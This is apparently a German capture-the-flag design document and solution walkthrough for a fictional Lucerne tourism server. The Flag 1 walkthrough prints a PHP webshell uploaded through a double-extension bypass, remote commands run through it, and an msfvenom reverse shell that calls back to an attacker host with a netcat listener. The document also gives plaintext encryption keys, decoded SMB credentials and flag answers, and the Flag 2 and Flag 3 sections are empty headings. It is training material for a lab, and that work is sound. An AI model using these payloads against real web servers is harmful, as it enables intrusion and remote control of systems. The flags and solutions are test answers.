konfigurator@lutourismus:~$ sudo useradd -m -s /bin/bash -g internalIT operator
konfigurator@lutourismus:~$ sudo passwd operator
New password: 
Retype new password: 
passwd: password updated successfully
```

### Erstellung Python Skript (Verschlüsselung)

Für die Ausführung des Python Verschlüsselungsskripts wurden zuvor weitere Pakete installiert , um die verwendeten Algorithmen (AES, RC4 usw.) nutzen zu können. Hierfür wurden mit dem Paketmanager **pip** die Pakete **pycryptodome** und **arc4** installiert.

Durch die Option `--break-system-packages` werden diese Pakete systemweit eingebunden, sodass das Skript direkt über `python3` ausgeführt werden kann. Dieses Vorgehen ist jedoch **nicht empfehlenswert**, da systemweite Änderungen zu Instabilitäten führen können. In produktiven Umgebungen sollte stattdessen ein **Virtual Environment** verwendet werden.

```bash
konfigurator@lutourismus:~$ sudo apt install python3-pip -y
konfigurator@lutourismus:~$ sudo pip3 install pycryptodome --break-system-packages
konfigurator@lutourismus:~$ sudo pip3 install arc4 --break-system-packages
```

Für die Verschlüsselung des **Operator Passworts** wurde ein Python-Skript mit dem Namen **`encrypt.py`** erstellt. Dieses Skript verschlüsselt einen über den Parameter `-i` übergebenen String und speichert das Ergebnis als Chiffretext in der Datei **`encrypted.enc`**. Beide Dateien befinden sich im Verzeichnis `/share/internalIT`.

Das Skript führt eine mehrstufige Verschlüsselung durch. Zunächst wird der Klartext mit AES im CBC-Modus verschlüsselt. Anschliessend erfolgt eine zusätzliche XOR-Verschlüsselung, bevor die Daten mit gzip komprimiert werden. Im letzten Schritt werden die komprimierten Daten mit dem RC4-Algorithmus verschlüsselt. Das Endergebnis wird schliesslich im HEX Fomat in der Ausgabedatei gespeichert.

Der Parameter **`b`** vor den Schlüsseln (z. B. `b"AES_R1v3r_2025_SUP3R_S3cur3_K3y!"`) kennzeichnet in Python sogenannte **Byte Strings**. Dies ist erforderlich, da kryptografische Bibliotheken wie **PyCryptodome** oder **arc4** ausschliesslich mit Bytefolgen und nicht mit Textstrings arbeiten.

- https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html
- https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html

```python
#!/usr/bin/env python3
import sys, argparse, gzip, io, os
from Crypto.Cipher import AES
from arc4 import ARC4

def pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def xor_bytes(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        out[i] = b ^ key[i % klen]
    return bytes(out)

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--input", help="Input string or file path", required=True)
parser.add_argument("-o", "--output", help="Output file name", default="encrypted.enc")
args = parser.parse_args()

if os.path.isfile(args.input):
    with open(args.input, "rb") as f:
        plaintext = f.read()
else:
    plaintext = args.input.encode()

aes_key = b"<Key>"
aes_iv = b"<IV>"
cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
ct = cipher.encrypt(pad(plaintext))

xor_key = b"<Key>"
xored = xor_bytes(ct, xor_key)

compressed = gzip.compress(xored)

rc4_key = b"<Key>"
rc4 = ARC4(rc4_key)
final = rc4.encrypt(compressed)

with open(args.output, "w") as f:
    f.write(final.hex())

print(f"written {args.output}")
```

Mit dem Skript wurde das Passwort verschlüsselt und der Chiffretext in **`encrypted.enc`** gespeichert. Dabei wurden die folgenden Schlüssel verwendet:

- AES Key: `AES_R1v3r_2025_SUP3R_S3cur3_K3y!`
- AES IV: `IV_rnpL4yLucerne`
- XOR: `S3cretXOR!_For_Encryption`
- RC4: `RC4@Alpine_Mountain_Stream_#42`

```bash
root@lutourismus:/share/internalIT# python3 encrypt.py -i "J5p57xAr4MrQ2LrcFzDILsbdQqUM0g"
written encrypted.enc
```

### Verstecken der Schlüssel

Im Verzeichnis `/tmp` wurden drei versteckte Dateien abgelegt: `/tmp/.build_manifest`, `/tmp/.deploy_checkpoin**t**` und `/tmp/.session_state`.

- **/tmp/.build_manifest**: enthält den AES-Key und den IV
- **/tmp/.deploy_checkpoint**: enthält den XOR-Schlüsse**l**
- **/tmp/.session_state**: enthält den RC4-Key

Die Dateien liegen im Klartext und sind durch den Punkt am Anfang als “hidden” markiert . Die Schlüssel sind so aufgebaut, dass sofort erkennbar ist, welcher String zu welchem Algorithmus gehört.

```bash
konfigurator@lutourismus:/tmp$ cat .build_manifest 
# -----------------------------------------------------------------------------
# build manifest - lucerne campaign
# generated-by: ci-runner/frontend-smoke-01
# pipeline: build -> smoke-tests -> package
# environment: integration (ephemeral)
# -----------------------------------------------------------------------------
artifact_name = web-front:lucerne:1.0.3
artifact_sha1 = 9f8b7a6c5d4e3f2a1b0c
build_user = ci-runner
node = frontend-smoke-01
tests_run = smoke,encryption,integration

[encryption_test]
# AES parameters used for local smoke-test roundtrip
aes_key = "AES_R1v3r_2025_SUP3R_S3cur3_K3y!"
iv = "IV_rnpL4yLucerne"

konfigurator@lutourismus:/tmp$ cat .deploy_checkpoint 
# deploy checkpoint - worker pipeline staging
# pipeline: transform-stage-2
# retention: ephemeral
---
component: worker_pipeline
version: 2.4.1
last_processed_id: 123456
batch_size: 500
retry_policy: exponential_backoff

# The checkpoint contains the obfuscation parameters used during the failed run
obfuscation:
  method: XOR
  key: "S3cretXOR!_For_Encryption"

konfigurator@lutourismus:/tmp$ cat .session_state
# session state dump - operator maintenance harness
# tool: encrypt-harness v0.9
# user: operator
# purpose: run manual encryption/restore tests for operator password
session:
  id: enc-test-2025
  mode: debug
  timestamp: 2025-10-15T18:52:44Z

# The following values are provided to allow quick repro of encryption runs
RC4_KEY = "RC4@Alpine_Mountain_Stream_#42"

actions:
  - step: prepare
  - step: encrypt
```

### Ablegen von Hinweisen

Im Verzeichnis `/share/public` wurde die Datei **`LuzernerMoments_Flyer.pdf`** abgelegt. Sie enthält den Kampagnenflyer zur Marketingaktion #LuzernerMoments. Der Flyer selbst enthält keine technischen Hinweise – der einzige relevante Hinweis ist die URL, die auf die Webseite des Luzerner Tourismusbüros verweist ([www.tourismusluzern.ch](http://www.tourismusluzern.ch)).

![LuzernerMoments_Flyer.pdf](attachment:c05eafae-a6bf-44ff-b8ca-5f37f15ff9b8:Flyer.png)

Die Datei **`DisasterRecovery.txt`** dient im CTF als Hinweis darauf, dass das Passwort des Operator Accounts verschlüsselt wurde. Es soll die Spieler:innen auf die verschlüsselte Datei aufmerksam machen. Die Datei befindet sich im Verzeichnis `/share/internalIT`.

```
Luzerner Tourismusbüro – Notfallablage
--------------------------------------

Für Disaster Recovery Zwecke wurde das Passwort des Operator Accounts 
verschlüsselt in diesem Verzeichnis abgelegt. Eine Speicherung im 
Klartext ist gemäss unseren Sicherheitsrichtlinien nicht zulässig. 

Das eigentliche Entschlüsselungsskript wird aus Sicherheitsgründen 
nicht zusammen aufbewahrt. Es befindet sich auf einem 
gesicherten USB-Stick, der in unserem Tresor gelagert wird.

Im Ernstfall kann das Passwort daher nur mit Hilfe dieses Datenträgers 
wiederhergestellt werden.
```

Im selben Verzeichnis befindet sich zudem die Datei **`TODO.txt`**, die einen weiteren Hinweis zu den Schlüssel enthält. Da darin von einem *Verzeichnis* und *temporären Dateien* die Rede ist, lässt dies darauf schliessen, dass sich die Schlüssel im `/tmp` Verzeichnis befinden könnten.

```
TODO – interne Nacharbeiten
---------------------------

Nach dem Go-Live der Kampagne ist aufgefallen, dass während der Entwicklungs- und Testphase 
möglicherweise noch Schlüssel in temporären Dateien im System verblieben sind.

Zur Qualitätssicherung und um Risiken im Produktivbetrieb zu vermeiden, sollte das Verzeichnis überprüft werden.

Bitte kontrolliere, ob noch Schlüssel oder ähnliche Artefakte vorhanden sind und entferne diese umgehend.
```

### Flag

Nach erfolgreichem Zugriff auf den Operator Account befindet sich das Flag in der Datei `/home/operator/operator.txt`. Die Dateiberechtigungen wurden so gesetzt, dass ausschliesslich der Benutzer **`operator`** die Datei lesen kann.

- **Flag:** `flag{operator_crypto_2025_7f4b9a}`

```bash
operator@lutourismus:~$ echo 'flag{operator_crypto_2025_7f4b9a}' > /home/operator/operator.txt
operator@lutourismus:~$ chmod 400 /home/operator/operator.txt
operator@lutourismus:~$ ls -l
total 4
-r-------- 1 operator internalIT 34 Oct 16 14:36 operator.txt
```

## Flag 3: Root Access - Privilege Escalation via Cronjob

Die automatische Bild-Pipeline der **#LuzernerMoments**-Aktion überwacht das Upload-Verzeichnis `/.../uploads/` und verarbeitet neue Einträge mit einem Operator-Service. Der Operator hat ein Bash-Script `/usr/local/bin/.process_images.sh`, das regelmässig per Cron gestartet wird (als **root**), die aktuell vorgesehenen Uploads aus einer Job-Liste `/usr/local/bin/.joblist` abarbeitet und verarbeitete Dateien nach `/var/processed/` verschiebt. Der Operator hat keinen Schreibzugriff auf das Script selbst, aber auf `/usr/local/bin/.joblist`. Das Script `/usr/local/bin/ .process_images.sh` hat schlechte Inputvalidierung, was zusammen mit einem root Cronjob eine Privilege Escalation ermöglicht. 

Wichtige Info’s:

- Der Operator hat **Schreibzugriff** auf `/usr/local/bin/.joblist`.
- Der Operator hat **keinen** Schreibzugriff und nur Lesezugriff auf `/usr/local/bin/.process_images.sh` .
- Cron führt `/usr/local/bin/.process_images.sh` jede Minute als **root** aus.
- Uploads landen in `/.../uploads/` und werden durch die Job-Liste referenziert, ein Eintrag in `.joblist` entspricht einem zu verarbeitenden Dateinamen.

## Bereinigungen

Nachdem alle Aufgaben abgeschlossen waren, wurde der Benutzer **`konfigurator`** wieder gelöscht. Zudem wurden die Bash- und Nano History geleert, um keine Hinweise oder Befehle zurückzulassen.

```bash
sudo userdel -r konfigurator
history -cw
rm -f ~/.nano_history
```

# Lösungs Walkthrough

Dieser Abschnitt beschriebt den vollständigen Lösungs Walkthrough des CTF in chronologischer Reihenfolge. Es wird gezeigt, wie die einzelnen Flags gefunden und gelöst werden können. Zu jedem Flag werden die nötigen Schritte, die verwendeten Werkzeuge, die wichtigsten Befehle und die gefundenen Artefakte klar dokumentiert.

## Walkthrough Flag 1: Initial Access via RCE

### Schritt 1: Web-Enumeration & Reconnaissance

Als Erstes wird eine Web-Enumeration durchgeführt, um die Struktur der Webseite und mögliche interessante Pfade zu identifizieren. Hierfür können Tools wie **dirb**, **gobuster** oder **feroxbuster** verwendet werden.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.0.2.10/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.10/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/assets               (Status: 301) [Size: 311] [--> http://10.0.2.10/assets/]
/config               (Status: 301) [Size: 311] [--> http://10.0.2.10/config/]
/config.php           (Status: 200) [Size: 0]
/data                 (Status: 301) [Size: 309] [--> http://10.0.2.10/data/]
/index.php            (Status: 200) [Size: 3782]
/old                  (Status: 301) [Size: 308] [--> http://10.0.2.10/old/]
/robots.txt           (Status: 200) [Size: 287]
/thanks.php           (Status: 200) [Size: 2134]
/upload.php           (Status: 302) [Size: 0] [--> http://10.0.2.10/thanks.php]
/uploads              (Status: 301) [Size: 312] [--> http://10.0.2.10/uploads/]
===============================================================
Finished
===============================================================
```

Die Enumeration zeigt interessante Dateien und Verzeichnisse:
- `/robots.txt` - Könnte Hinweise enthalten
- `/uploads/` - Verzeichnis für hochgeladene Dateien
- `/upload.php` - Upload-Handler
- `/data/` - Daten-Verzeichnis (geschützt)
- `/config/` - Konfigurationsverzeichnis (decoy)
- `/old/` - Altes Verzeichnis (decoy)

### Schritt 2: Analyse von robots.txt

Die `robots.txt`-Datei wird untersucht, um zu sehen, welche Bereiche für Crawler gesperrt sind:

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.10/robots.txt

# Luzerner Tourismusbüro - robots.txt
# #LuzernerMoments Kampagne

User-agent: *
Disallow: /uploads/
Disallow: /data/
Disallow: /config/
Disallow: /old/
Disallow: /backup_smb.sh
Allow: /
```

**Erkenntnisse:**
- `/uploads/` ist für Crawler gesperrt (Upload-Verzeichnis)
- `/data/` enthält vermutlich sensible Informationen (durch `.htaccess` geschützt)
- `/config/` und `/old/` sind Decoy-Verzeichnisse
- `/backup_smb.sh` wird erwähnt (Hinweis für Flag 2)
- `uploads/` dient als improvisierte Galerie und kann direkt erkundet werden

### Schritt 3: Untersuchung des Upload-Verzeichnisses

Die Enumeration und der Eintrag in `robots.txt` weisen auf `/uploads/` hin. Beim Aufruf des Verzeichnisses wird `uploads/index.php` ausgeführt und listet die vorhandenen Dateien auf:

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.10/uploads/
```

Die Übersicht bestätigt, dass die hochgeladenen Dateien unter ihrem Originalnamen abgelegt werden – inklusive der Dateiendungskombinationen. Genau diese Information ist für den Double-Extension-Angriff entscheidend.

### Schritt 4: Test der Upload-Funktionalität

Zunächst wird ein normaler Upload mit einem echten Bild getestet, um die Funktionalität zu verstehen:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.10/upload.php \
  -F "name=Test User" \
  -F "email=test@example.com" \
  -F "description=Beautiful moment from Luzern" \
  -F "photo=@luzern_test.jpg"

# Redirect zu: http://10.0.2.10/thanks.php?photo=luzern_test.jpg
```

**Wichtige Erkenntnis:** Der Upload funktioniert und die Datei wird unter dem **Original-Dateinamen** im `/uploads/`-Verzeichnis gespeichert (keine Randomisierung!). Dies bedeutet, dass hochgeladene Dateien später leicht zu finden sind, da der Dateiname bekannt ist.

### Schritt 5: Identifizierung der Schwachstelle

Als Nächstes wird getestet, ob die Validierung umgangen werden kann. Es wird versucht, eine PHP-Datei mit **Double-Extension** hochzuladen.

**Erstelle eine einfache PHP-Webshell:**

```bash
┌──(kali㉿kali)-[~]
└─$ cat > shell.php.jpg << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Die Datei hat den Namen `shell.php.jpg`:
- Die Endung ist `.jpg` (wird von der Validierung akzeptiert)
- Der Dateiname enthält `.php` (könnte von Apache als PHP interpretiert werden)

**Upload der Webshell:**

Es gibt zwei Möglichkeiten, die Datei hochzuladen:

**Option 1: Browser-Upload**
1. Besuche `http://10.0.2.10/`
2. Wähle die Datei `shell.php.jpg` aus
3. Fülle die Formularfelder aus
4. Klicke auf "Moment teilen"

**Option 2: Upload via curl**

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.10/upload.php \
  -F "name=Tourist" \
  -F "email=tourist@example.com" \
  -F "description=Beautiful sunset" \
  -F "photo=@shell.php.jpg"

# Redirect zu: http://10.0.2.10/thanks.php?photo=shell.php.jpg
```

Der Upload wird akzeptiert! Die Applikation prüft nur die letzte Endung `.jpg` mit `pathinfo()` und übersieht, dass `.php` in der Dateiendung enthalten ist. Die Datei wird unter ihrem **Original-Namen** gespeichert: `/uploads/shell.php.jpg`

### Schritt 6: Remote Code Execution (RCE)

Die hochgeladene Datei kann nun direkt aufgerufen werden. Da der Dateiname bekannt ist (`shell.php.jpg`), muss nicht nach dem Dateinamen gesucht werden. Apache interpretiert die Datei als PHP, weil die `.htaccess`-Konfiguration alle Dateien mit `.php` im Namen als PHP ausführt:

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Erfolg!** Remote Code Execution wurde erreicht. Der PHP-Code wird als User `www-data` ausgeführt.

**Technischer Hintergrund:** Die `.htaccess`-Datei enthält folgende Regel:

```apache
<FilesMatch ".+\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Diese Regel matched auf **alle Dateien**, die `.php` irgendwo im Dateinamen haben. Die Datei `shell.php.jpg` enthält `.php` und wird daher von Apache als PHP-Code interpretiert und ausgeführt.

### Schritt 7: System-Enumeration

Mit der RCE können nun verschiedene Befehle ausgeführt werden, um das System zu erkunden:

```bash
# Prüfe aktuellen User
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=whoami"

www-data

# Liste das Web-Verzeichnis
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=ls%20-la%20/var/www/html"

total 56
drwxr-xr-x 7 www-data www-data 4096 Oct 22 18:00 .
drwxr-xr-x 3 root     root     4096 Oct 22 17:00 ..
-rw-r--r-- 1 www-data www-data 1247 Oct 22 17:51 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Oct 22 17:51 assets
drwxr-xr-x 2 www-data www-data 4096 Oct 22 18:00 config
-rw-r--r-- 1 www-data www-data  485 Oct 22 17:51 config.php
drwxr-xr-x 2 www-data www-data 4096 Oct 22 17:51 data
-rw-r--r-- 1 www-data www-data 1842 Oct 22 18:21 functions.php
-rw-r--r-- 1 www-data www-data 2847 Oct 22 18:19 index.php
drwxr-xr-x 2 www-data www-data 4096 Oct 22 18:00 old
-rw-r--r-- 1 www-data www-data  345 Oct 22 18:07 robots.txt
-rw-r--r-- 1 www-data www-data 2431 Oct 22 17:51 thanks.php
-rw-r--r-- 1 www-data www-data 1987 Oct 22 18:42 upload.php
drwxr-xr-x 2 www-data www-data 4096 Oct 22 18:48 uploads

# Prüfe Upload-Log
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=cat%20/var/www/html/data/uploaded_files.txt"

[2025-10-22 18:45:12] Uploaded: luzern_test.jpg by Test User (test@example.com)
[2025-10-22 18:46:34] Uploaded: shell.php.jpg by Tourist (tourist@example.com)

# Prüfe /home Verzeichnis
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=ls%20-la%20/home"

total 16
drwxr-xr-x  4 root     root     4096 Oct 22 17:30 .
drwxr-xr-x 19 root     root     4096 Oct 22 17:00 ..
drwxr-x---  2 operator internalIT 4096 Oct 16 14:36 operator
drwxr-xr-x  2 webflag  webflag  4096 Oct 22 17:35 webflag
```

**Erkenntnisse:**
- Es gibt zwei User-Verzeichnisse: `operator` und `webflag`
- Das Verzeichnis `/home/webflag` ist für `www-data` zugänglich (Berechtigungen: `755`)
- Das Upload-Log in `/var/www/html/data/uploaded_files.txt` zeigt alle hochgeladenen Dateien

### Schritt 8: Flag-Extraktion

Die Flag befindet sich in `/home/webflag/flag.txt`. Da das Verzeichnis mit Berechtigungen `755` konfiguriert ist, kann `www-data` darauf zugreifen:

```bash
# Liste Inhalt von /home/webflag
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=ls%20-la%20/home/webflag"

total 12
drwxr-xr-x 2 webflag webflag 4096 Oct 22 17:35 .
drwxr-xr-x 4 root    root    4096 Oct 22 17:30 ..
-r--r--r-- 1 webflag webflag   43 Oct 22 17:35 flag.txt

# Lese die Flag
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=cat%20/home/webflag/flag.txt"

flag{initial_access_luzernermoments_83723}
```

**Erfolg!** Die Flag ist für alle lesbar und kann mit `www-data` Rechten ausgelesen werden.

**Flag 1 gefunden:** `flag{initial_access_luzernermoments_83723}`

### Schritt 9: Alternative - Reverse Shell mit msfvenom (Optional)

Für eine vollwertige Reverse Shell kann **msfvenom** aus dem Metasploit Framework verwendet werden:

**Payload-Generierung:**

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p php/reverse_php LHOST=10.0.2.5 LPORT=4444 -f raw > reverse.php

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2679 bytes

┌──(kali㉿kali)-[~]
└─$ mv reverse.php reverse.php.jpg
```

**Listener aufsetzen:**

```bash
# Terminal 1: Starte Netcat Listener
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Upload und Trigger:**

```bash
# Terminal 2: Upload msfvenom Payload
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.10/upload.php \
  -F "name=Attacker" \
  -F "email=attacker@evil.com" \
  -F "description=Pwned" \
  -F "photo=@reverse.php.jpg"

# Trigger Payload (Dateiname ist bekannt!)
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.10/uploads/reverse.php.jpg
```

**Reverse Shell empfangen:**

```bash
# Terminal 1: Netcat Listener
connect to [10.0.2.5] from (UNKNOWN) [10.0.2.10] 54321

# Upgrade Shell (optional)
python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@lutourismus:/var/www/html/uploads$ whoami
www-data

www-data@lutourismus:/var/www/html/uploads$ cd /home/webflag
www-data@lutourismus:/home/webflag$ cat flag.txt
flag{initial_access_luzernermoments_83723}
```

### Schritt 10: Übergang zu Flag 2

Mit dem Initial Access können nun weitere interessante Dateien untersucht werden:

```bash
www-data@lutourismus:/$ ls -la /usr/local/sbin/
total 16
drwxr-xr-x 2 root root 4096 Oct 11 13:46 .
drwxr-xr-x 10 root root 4096 Oct 11 10:00 ..
-rwxr--r-- 1 root root 2012 Oct 11 13:46 backup_smb.sh

www-data@lutourismus:/$ cat /usr/local/sbin/backup_smb.sh
#!/bin/bash
...
U=$(echo YmFja3Vwc21i | base64 -d)
P=$(echo eU1UclRiQWM1NlUyTzgwd1RsbFk4VGcxbUpKWU93 | base64 -d)
...
```

Das Skript `backup_smb.sh` (aus `robots.txt`) enthält Base64-kodierte Zugangsdaten für SMB. Dies führt direkt zu **Flag 2**.

### Zusammenfassung Flag 1

**Schwachstellen-Kette:**

1. **Verstecktes Upload-Verzeichnis:** `/uploads/` nicht in Navigation → Wird durch Enumeration entdeckt
2. **Schwache Upload-Validierung:** Nur letzte Dateiendung wird geprüft (`pathinfo()`)
3. **Keine Filename-Sanitization:** Original-Dateinamen werden verwendet (keine Randomisierung)
4. **Apache FilesMatch:** `.htaccess` führt alle Dateien mit `.php` im Namen als PHP aus
5. **Fehlende Upload-Absicherung:** PHP-Execution im `/uploads/` Verzeichnis nicht deaktiviert
6. **Zugängliches Flag:** `/home/webflag/` mit Berechtigungen `755` erlaubt www-data Zugriff

**Exploitation-Flow:**

1. **Enumeration:** gobuster/dirb findet `/uploads/`
2. **Reconnaissance:** robots.txt zeigt interessante Pfade
3. **Vulnerability Testing:** Upload mit normalem Bild testen
4. **Weaponization:** 
   - **Option A:** Einfache Webshell: `echo '<?php system($_GET[cmd]); ?>' > shell.php.jpg`
   - **Option B:** msfvenom: `msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > reverse.php`
5. **Delivery:** Upload `shell.php.jpg` oder `reverse.php.jpg` (Browser oder curl)
6. **Exploitation:** Zugriff auf `/uploads/shell.php.jpg` (Dateiname bekannt!)
7. **Actions on Objective:** RCE als www-data → Flag-Extraktion

**Verwendete Tools:**

- **gobuster/dirb/feroxbuster:** Web-Enumeration und Discovery
- **curl:** HTTP-Requests und Upload-Testing
- **msfvenom:** Payload-Generierung (Metasploit Framework)
- **netcat (nc):** Reverse Shell Listener
- **Standard Linux-Tools:** ls, cat, whoami, id

**Geförderte Fähigkeiten:**

- Web-Reconnaissance und Enumeration
- Identifizierung versteckter Endpunkte
- Analyse von Datei-Upload-Mechanismen
- Double-Extension-Bypass-Techniken
- Apache .htaccess Konfigurationsschwachstellen
- Payload-Generierung mit msfvenom
- Remote Code Execution (RCE)
- Linux-Filesystem-Navigation
- Initial Access und Post-Exploitation

Flag 2

Flag 3
